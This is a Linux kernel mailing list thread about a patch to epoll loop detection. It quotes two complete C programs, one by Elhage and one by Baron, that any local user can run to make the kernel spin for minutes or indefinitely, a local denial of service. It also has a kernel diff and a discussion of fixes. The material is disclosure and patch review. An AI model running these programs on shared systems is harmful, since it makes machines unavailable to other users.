Return-Path: <linux-kernel-owner@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1754906Ab1B1UNH (ORCPT <rfc822;w@1wt.eu>);
	Mon, 28 Feb 2011 15:13:07 -0500
Received: from mx1.redhat.com ([209.132.183.28]:35784 "EHLO mx1.redhat.com"
	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
	id S1752669Ab1B1UNF (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
	Mon, 28 Feb 2011 15:13:05 -0500
Date: Mon, 28 Feb 2011 15:12:06 -0500
From: Jason Baron <jbaron@redhat.com>
To: Nelson Elhage <nelhage@ksplice.com>
Cc: davidel@xmailserver.org, akpm@linux-foundation.org,
        linux-kernel@vger.kernel.org, linux-fsdevel@vger.kernel.org,
        security@kernel.org
Subject: Re: [PATCH] optimize epoll loop detection
Message-ID: <20110228201205.GA2965@redhat.com>
References: <201102251950.p1PJorw9023013@int-mx12.intmail.prod.int.phx2.redhat.com> <20110226025830.GA22935@ksplice.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <20110226025830.GA22935@ksplice.com>
User-Agent: Mutt/1.5.18 (2008-05-17)
Sender: linux-kernel-owner@vger.kernel.org
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

On Fri, Feb 25, 2011 at 09:58:30PM -0500, Nelson Elhage wrote:
> This patch looks reasonable to me, but unfortunately, thinking about
> this, the problem is even worse than you've described.
> 
> In particular, causing a wakeup up an epoll fd makes it wakeup any
> epoll fds that contain it. So if I have a big tree of epoll fd's, and
> trigger a wakeup on the right one, the kernel does the exact same kind
> of brute-force walk of the entire tree.
> 
> This is somewhat worse than your example in that you can make it
> happen in interrupt context (since it's triggered by an fd wakeup,
> instead of directly from a syscall), but also because it exists even
> before the recent patch.
> 
> Secondly, because epoll fd's actually store (struct file*, int fd)
> pairs, you can add a single epoll fd to another fd multiple times, so
> you can carry out the same attack with only 4 epoll fd's, which you
> take turns dup()ing, adding to the next one, and then closing
> all-but-one references to. This lets you crank the base of the
> exponent up almost to RLIMIT_NOFILE, instead of RLIMIT_NOFILE/4. The
> following test program causes one CPU to hang basically indefinitely,
> even without the cycle-prevention patch:
> 
> -----
> #include <unistd.h>
> #include <sys/epoll.h>
> #include <stdio.h>
> #include <stdlib.h>
> 
> #define DEPTH 6
> #define FANOUT 1000
> 
> void die(const char *msg) {
>     perror(msg);
>     exit(-1);
> }
> 
> void add_many(int parent, int child) {
>     int i;
>     int fds[FANOUT];
>     struct epoll_event evt = { .events = EPOLLIN };
>     for (i = 0; i < FANOUT; i++) {
>         if ((fds[i] = dup(child)) < 0)
>             die("dup");
> 
>         if (epoll_ctl(parent, EPOLL_CTL_ADD, fds[i], &evt) < 0)
>             die("add");
>     }
>     for (i = 0; i < FANOUT; i++)
>         close(fds[i]);
> }
> 
> int main(void) {
>     int fds[DEPTH];
>     int i;
>     int p[2];
>     struct epoll_event evt = { .events = EPOLLIN };
> 
>     for (i = 0; i < DEPTH; i++) {
>         if ((fds[i] = epoll_create(1)) < 0)
>             die("create");
>     }
>     for (i = 1; i < DEPTH; i++) {
>         add_many(fds[i-1], fds[i]);
>     }
>     if (pipe(p) < 0)
>         die("pipe");
> 
>     epoll_ctl(fds[DEPTH-1], EPOLL_CTL_ADD, p[0], &evt);
>     write(p[1], p, sizeof(int));
> 
>     return 0;
> }
> ----
> 
> A similar marking-visited-fds patch might be workable here, but the
> concurrency is going to be much trickier, since there may be multiple
> wakeups going on at once.
> 
> - Nelson
> 

indeed, the brute-force walk can be tickled by quite a few paths in the
epoll code....in terms of a fix, even if we disabled local irq for
ep_poll_safewake(), we still can have NR_CPUS running these brute-force
walks. Then to store the visisted list we would need NR_CPUS bits per
struct eventpoll. That's way too much space. Instead we could have
say a u64, per 'struct eventpoll', and essentially, pass out 1 of the 64
open slots as needed. If they are all busy we spin waiting for a free
one. Of course its probabilistic over 64 cpus...

The other thing of course, is to cut down on the allowable branching and
nesting factors. I'm not sure how viable that is in terms of potential
regressions...

thanks,

-Jason


> On Fri, Feb 25, 2011 at 02:50:53PM -0500, Jason Baron wrote:
> > Hi,
> > 
> > The recent epoll patch to prevent introducing cycles among the epoll
> > data structures is implemented using a brute force search. Although,
> > the epoll code limits path lengths to 4 deep, it is still possible
> > exploit the algorithm and cause a local dos. Using the program below,
> > I was able to busy the kernel to run for 15 minutes in the loop
> > detection algorithm. (That can't be good for real-time performance :))
> > 
> > The test program is diabolical, but it represents a local 'dos'
> > attack. The program can be run by any user, and uses almost all 1024
> > of its open file descriptor limit. If that limit were raised by a
> > sysadmin, the program could be run indefinitely. (The run time is
> > basically: (max # of open file descriptors / 4) ^ 4. So in the
> > case of 1024 max file descriptor, we generate ~256 ^ 4 path checks,
> > which causes a quite a lot of function calls.
> > 
> > We can improve the loop detection code, to not be brute force, and
> > make sure that it doesn't re-visit nodes that it has already visited.
> > Using this optimized version the 15 minute test ran in .3 seconds.
> > The algorithm relies on the fact that there are no cycles in the
> > graph to begin with, and thus the newly added link must be involved
> > in the cycle (if there is one introduced).
> > 
> > I've re-tested the original test program, and the diabolical test
> > case below, but otherwise haven't done further epoll testing.
> > 
> > test program:
> > 
> > #include <unistd.h>
> > #include <sys/epoll.h>
> > #include <sys/time.h>
> > #include <stdio.h>
> > 
> > #define SIZE 250
> > 
> > int main(void) {
> > 
> > 	int links[SIZE];
> > 	int links2[SIZE];
> > 	int links3[SIZE];
> > 	int links4[SIZE];
> > 	int i, j;
> > 	int ret;
> > 	int ep1, ep2;
> > 	struct timeval start, end;
> > 
> > 	struct epoll_event evt = {
> > 		.events = EPOLLIN
> > 	};
> > 
> > 	ep1 = epoll_create(1);
> > 	for (i = 0; i < SIZE; i++) {
> > 		links[i] = epoll_create(1);
> > 		ret = epoll_ctl(ep1, EPOLL_CTL_ADD, links[i], &evt);
> > 		if (ret)
> > 			perror("error 1");
> > 	}
> > 	for (i = 0; i < SIZE; i++) {
> > 		links2[i] = epoll_create(1);
> > 		for (j = 0; j < SIZE; j++) {
> > 			epoll_ctl(links[j], EPOLL_CTL_ADD, links2[i], &evt);
> > 			if (ret)
> > 				perror("error 2");
> > 		}
> > 	}
> > 	for (i = 0; i < SIZE; i++) {
> > 		links3[i] = epoll_create(1);
> > 		for (j = 0; j < SIZE; j++) {
> > 			epoll_ctl(links2[j], EPOLL_CTL_ADD, links3[i], &evt);
> > 			if (ret)
> > 				perror("error 3");
> > 		}
> > 	}
> > 	for (i = 0; i < SIZE; i++) {
> > 		links4[i] = epoll_create(1);
> > 		for (j = 0; j < SIZE; j++) {
> > 			epoll_ctl(links3[j], EPOLL_CTL_ADD, links4[i], &evt);
> > 			if (ret)
> > 				perror("error 4");
> > 		}
> > 	}
> > 
> >  	ep2 = epoll_create(1);
> > 	gettimeofday(&start, NULL);
> > 	ret = epoll_ctl(ep2, EPOLL_CTL_ADD, ep1, &evt);
> > 	/* creates a loop */
> > 	//ret = epoll_ctl(links4[499], EPOLL_CTL_ADD, ep1, &evt);
> > 	if (ret)
> > 		perror("error 5");
> > 	gettimeofday(&end, NULL);
> > 
> > 	printf("%ld\n", ((end.tv_sec * 1000000 + end.tv_usec)
> > 		- (start.tv_sec * 1000000 + start.tv_usec)));
> > 
> > 	return 0;
> > 
> > }
> > 
> > thanks,
> > 
> > -Jason
> > 
> > Signed-off-by: Jason Baron <jbaron@redhat.com>
> > ---
> >  fs/eventpoll.c |   26 ++++++++++++++++++++++++--
> >  1 files changed, 24 insertions(+), 2 deletions(-)
> > 
> > diff --git a/fs/eventpoll.c b/fs/eventpoll.c
> > index 4a09af9..ea74bc9 100644
> > --- a/fs/eventpoll.c
> > +++ b/fs/eventpoll.c
> > @@ -95,6 +95,9 @@ struct epoll_filefd {
> >  	int fd;
> >  };
> >  
> > +/* used to keep track of visited nodes, so they can be cleared */
> > +LIST_HEAD(visited_list);
> > +
> >  /*
> >   * Structure used to track possible nested calls, for too deep recursions
> >   * and loop cycles.
> > @@ -188,6 +191,10 @@ struct eventpoll {
> >  
> >  	/* The user that created the eventpoll descriptor */
> >  	struct user_struct *user;
> > +
> > +	/* used to optimize loop detection check */
> > +	int visited;
> > +	struct list_head visitedllink;
> >  };
> >  
> >  /* Wait structure used by the poll hooks */
> > @@ -1228,16 +1235,22 @@ static int ep_loop_check_proc(void *priv, void *cookie, int call_nests)
> >  	int error = 0;
> >  	struct file *file = priv;
> >  	struct eventpoll *ep = file->private_data;
> > +	struct eventpoll *ep_tovisit;
> >  	struct rb_node *rbp;
> >  	struct epitem *epi;
> >  
> >  	mutex_lock(&ep->mtx);
> > +	ep->visited = 1;
> > +	list_add(&ep->visitedllink, &visited_list);
> >  	for (rbp = rb_first(&ep->rbr); rbp; rbp = rb_next(rbp)) {
> >  		epi = rb_entry(rbp, struct epitem, rbn);
> >  		if (unlikely(is_file_epoll(epi->ffd.file))) {
> > +			ep_tovisit = epi->ffd.file->private_data;
> > +			if (ep_tovisit->visited)
> > +				continue;
> >  			error = ep_call_nested(&poll_loop_ncalls, EP_MAX_NESTS,
> >  					       ep_loop_check_proc, epi->ffd.file,
> > -					       epi->ffd.file->private_data, current);
> > +					       ep_tovisit, current);
> >  			if (error != 0)
> >  				break;
> >  		}
> > @@ -1260,8 +1273,17 @@ static int ep_loop_check_proc(void *priv, void *cookie, int call_nests)
> >   */
> >  static int ep_loop_check(struct eventpoll *ep, struct file *file)
> >  {
> > -	return ep_call_nested(&poll_loop_ncalls, EP_MAX_NESTS,
> > +	int ret;
> > +	struct eventpoll *ep_cur, *ep_next;
> > +
> > +	ret = ep_call_nested(&poll_loop_ncalls, EP_MAX_NESTS,
> >  			      ep_loop_check_proc, file, ep, current);
> > +	/* clear visited list */
> > +	list_for_each_entry_safe(ep_cur, ep_next, &visited_list, visitedllink) {
> > +		ep_cur->visited = 0;
> > +		list_del(&ep_cur->visitedllink);
> > +	}
> > +	return ret;
> >  }
> >  
> >  /*
> > -- 
> > 1.7.1
> > 
